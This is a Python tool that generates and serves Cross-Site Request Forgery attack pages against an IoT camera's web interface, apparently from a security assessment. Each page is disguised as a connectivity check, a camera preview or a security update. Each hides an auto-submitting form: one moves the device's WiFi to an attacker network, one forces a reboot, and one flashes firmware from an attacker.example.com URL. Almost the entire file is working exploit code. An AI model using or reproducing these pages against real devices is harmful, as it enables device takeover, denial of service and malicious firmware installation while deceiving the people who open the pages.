#!/usr/bin/env python3
"""
CSRF Attack Page Generator

Generates HTML pages that exploit Cross-Site Request Forgery vulnerabilities
in the CoreS3 IoT camera's web interface. The device has no CSRF protection
(no tokens, no Origin/Referer validation, no SameSite cookies) on any of its
state-changing POST endpoints.

Generated pages:
  csrf_wifi.html   - Reconfigures the device's WiFi to an attacker-controlled network
  csrf_reboot.html - Forces a device reboot (denial of service)
  csrf_ota.html    - Triggers a firmware update from an attacker-controlled URL

Optionally serves the generated pages via a local HTTP server for testing.

Usage examples:

  # Generate all CSRF pages targeting the default device IP
  ./csrf_pages.py --output-dir /tmp/csrf-attack

  # Generate pages targeting a specific device
  ./csrf_pages.py --target http://192.168.4.1 --output-dir ./attack-pages

  # Generate and immediately serve via HTTP
  ./csrf_pages.py --output-dir /tmp/csrf --serve --serve-port 8080

  # Then open in a browser connected to the device network:
  #   http://localhost:8080/csrf_wifi.html
"""

import argparse
import http.server
import os
import socketserver
import sys
import threading


DEFAULT_TARGET = "http://192.168.4.1"
DEFAULT_OUTPUT_DIR = "./csrf_pages"
DEFAULT_SERVE_PORT = 8080


CSRF_WIFI_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
    <title>Checking connectivity...</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .spinner {{
            border: 4px solid #eee;
            border-top: 4px solid #333;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Network Connectivity Check</h2>
        <div class="spinner"></div>
        <p>Analyzing your connection, please wait...</p>
    </div>

    <!-- CSRF: Reconfigure device WiFi to attacker-controlled network -->
    <iframe name="csrf_target" style="display:none"></iframe>
    <form id="csrf" action="{target}/apply" method="POST" target="csrf_target" style="display:none">
        <input type="hidden" name="ssid" value="attacker_network" />
        <input type="hidden" name="pass" value="attacker_password_123" />
    </form>

    <script>
        // Auto-submit when page loads.
        // The form POSTs to the IoT device. The browser sends it regardless
        // of Same-Origin Policy because SOP only blocks reading responses,
        // not sending requests. The hidden iframe prevents navigation.
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
"""


CSRF_REBOOT_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
    <title>Loading camera preview...</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #1a1a1a;
            color: #ccc;
        }}
        .container {{
            text-align: center;
            padding: 40px;
        }}
        .camera-icon {{
            font-size: 64px;
            margin-bottom: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="camera-icon">[CAMERA]</div>
        <h2>Loading camera stream...</h2>
        <p>Connecting to device, please wait.</p>
    </div>

    <!-- CSRF: Force device reboot (denial of service) -->
    <iframe name="csrf_target" style="display:none"></iframe>
    <form id="csrf" action="{target}/admin/reboot" method="POST" target="csrf_target" style="display:none">
    </form>

    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
"""


CSRF_OTA_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
    <title>Critical Security Update Available</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #fff3cd;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 8px;
            border: 2px solid #ffc107;
            max-width: 500px;
        }}
        .warning {{
            color: #856404;
            font-size: 48px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">[!]</div>
        <h2>Security Update in Progress</h2>
        <p>A critical firmware update is being applied to your camera.</p>
        <p>Do not close this page or disconnect the device.</p>
    </div>

    <!-- CSRF: Trigger OTA firmware update from attacker-controlled URL.
         Combined with lack of firmware signature verification, this
         allows flashing malicious firmware via the victim's browser. -->
    <iframe name="csrf_target" style="display:none"></iframe>
    <form id="csrf" action="{target}/ota" method="POST" target="csrf_target" style="display:none">
        <input type="hidden" name="url" value="http://attacker.example.com/malicious-firmware.bin" />
    </form>

    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
"""


def generate_pages(target, output_dir):
    """Generate all CSRF attack HTML pages."""
    os.makedirs(output_dir, exist_ok=True)

    pages = [
        ("csrf_wifi.html", CSRF_WIFI_TEMPLATE, "WiFi reconfiguration"),
        ("csrf_reboot.html", CSRF_REBOOT_TEMPLATE, "Device reboot (DoS)"),
        ("csrf_ota.html", CSRF_OTA_TEMPLATE, "OTA firmware update"),
    ]

    generated = []
    for filename, template, description in pages:
        content = template.format(target=target)
        filepath = os.path.join(output_dir, filename)
        with open(filepath, "w") as f:
            f.write(content)
        generated.append((filepath, description))
        print("[+] Generated: %s (%s)" % (filepath, description))

    return generated


def serve_directory(directory, port):
    """Start a simple HTTP server to serve the attack pages."""

    class QuietHandler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *handler_args, **handler_kwargs):
            super().__init__(*handler_args, directory=directory, **handler_kwargs)

        def log_message(self, fmt, *log_args):
            print("[HTTP] %s" % (fmt % log_args))

    try:
        with socketserver.TCPServer(("", port), QuietHandler) as httpd:
            print("[*] Serving CSRF pages at http://localhost:%d/" % port)
            print("[*] Press Ctrl+C to stop.")
            print()
            print("[*] Open in a browser connected to the device network:")

            for entry in os.listdir(directory):
                if entry.endswith(".html"):
                    print("    http://localhost:%d/%s" % (port, entry))

            print()
            httpd.serve_forever()
    except OSError as e:
        if "Address already in use" in str(e):
            print("[ERROR] Port %d is already in use. Try --serve-port with a different port." % port)
        else:
            print("[ERROR] %s" % e)
        sys.exit(1)
    except KeyboardInterrupt:
        print()
        print("[*] Server stopped.")


def main():
    parser = argparse.ArgumentParser(
        description="CSRF attack page generator for IoT camera exploitation.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s --output-dir /tmp/csrf-attack
  %(prog)s --target http://192.168.4.1 --output-dir ./pages
  %(prog)s --output-dir /tmp/csrf --serve --serve-port 8080

Generated pages auto-submit hidden forms to the device. Open them in a
browser that is connected to the same network as the target device.
The attacks work because the device performs no CSRF validation.
""",
    )

    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help="Device base URL for form action attributes (default: %s)" % DEFAULT_TARGET,
    )
    parser.add_argument(
        "--output-dir",
        default=DEFAULT_OUTPUT_DIR,
        help="Directory to write generated HTML files (default: %s)" % DEFAULT_OUTPUT_DIR,
    )
    parser.add_argument(
        "--serve",
        action="store_true",
        help="Start a local HTTP server to serve the generated pages",
    )
    parser.add_argument(
        "--serve-port",
        type=int,
        default=DEFAULT_SERVE_PORT,
        help="Port for the HTTP server (default: %d)" % DEFAULT_SERVE_PORT,
    )

    args = parser.parse_args()

    print("[*] CSRF Attack Page Generator")
    print("=" * 50)
    print()
    print("[*] Target device: %s" % args.target)
    print("[*] Output dir:    %s" % args.output_dir)
    print()

    generated = generate_pages(args.target, args.output_dir)

    print()
    print("[*] Generated %d CSRF attack pages." % len(generated))
    print()

    if not args.serve:
        print("[*] To serve these pages:")
        print("    %s --output-dir %s --serve --serve-port %d" % (
            sys.argv[0], args.output_dir, args.serve_port
        ))
        print()
        print("[*] Or use Python's built-in server:")
        print("    cd %s && python3 -m http.server %d" % (args.output_dir, args.serve_port))
    else:
        print()
        serve_directory(args.output_dir, args.serve_port)


if __name__ == "__main__":
    main()
